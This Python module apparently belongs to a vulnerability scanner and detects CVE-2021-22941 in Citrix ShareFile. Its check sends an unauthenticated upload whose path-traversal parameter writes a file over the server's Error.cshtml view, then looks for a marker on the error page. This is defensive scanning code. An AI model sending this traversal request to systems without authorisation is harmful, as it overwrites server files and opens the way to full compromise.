"""Agent Asteroid implementation for CVE-2021-22941"""

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions

DEFAULT_TIMEOUT = 90

def _encode_multipart_formdata(files: dict[str, str]) -> tuple[str, str]:
    boundary = "boundary"
    body = "".join(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{files["name"]}"; filename="{files["filename"]}"\r\n'
        "\r\n"
        f"{files['content_file']}\r\n" + f"--{boundary}--\r\n"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


class Exploit(definitions.BaseExploit):
    """
    CVE-2021-22941: Improper Access Control in Citrix ShareFile storage zones controller
    """

    def __init__(self, target: str):
        self.target = target

    @property
    def vulnerability_title(self) -> str:
        return "Improper Access Control in Citrix ShareFile storage zones controller"

    @property
    def vulnerability_reference(self) -> str:
        return "CVE-2021-22941"

    @property
    def vulnerability_description(self) -> str:
        return (
            "Improper Access Control in Citrix ShareFile storage zones controller before 5.11.20 may "
            "allow an unauthenticated attacker to remotely compromise the storage zones controller."
        )

    def accept(self) -> bool:
        try:
            req = requests.get(self.target, verify=False, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return "ShareFile" in req.text

    def check(self) -> list[definitions.Vulnerability]:
        content_file = "A" * 4096
        files = {"name": "text4", "filename": "text5", "content_file": content_file}
        data, content_type = _encode_multipart_formdata(files)
        headers = {"Content-Type": content_type}
        payload = "__VULNERABLE__"
        params = {
            "uploadid": payload + r"/../../ConfigService\Views\Shared\Error.cshtml",
            "bp": "123",
            "accountid": "123",
        }
        target_endpoint = self.target + "/upload.aspx"
        try:
            requests.post(
                target_endpoint,
                data=data,
                params=params,
                headers=headers,
                verify=False,
                timeout=DEFAULT_TIMEOUT,
            )
            req = requests.get(
                self.target + "/configservice/Home/Error",
                verify=False,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException as exc:
            return []
        if payload not in req.text:
            return []

        vulnerability = self.generate_vulnerability_object()
        return [vulnerability]

    def generate_vulnerability_object(self) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=self.vulnerability_title,
            risk_rating="HIGH",
            short_description=self.vulnerability_description,
            description=self.vulnerability_description,
            references={
                "nvd.nist.gov": "https://nvd.nist.gov/vuln/detail/CVE-2021-22941"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=False,
            targeted_by_malware=False,
            targeted_by_ransomware=False,
            targeted_by_nation_state=False,
        )
        technical_detail = f"{self.target} is vulnerable to {self.vulnerability_reference}, {self.vulnerability_title}"
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
        )
        return vulnerability
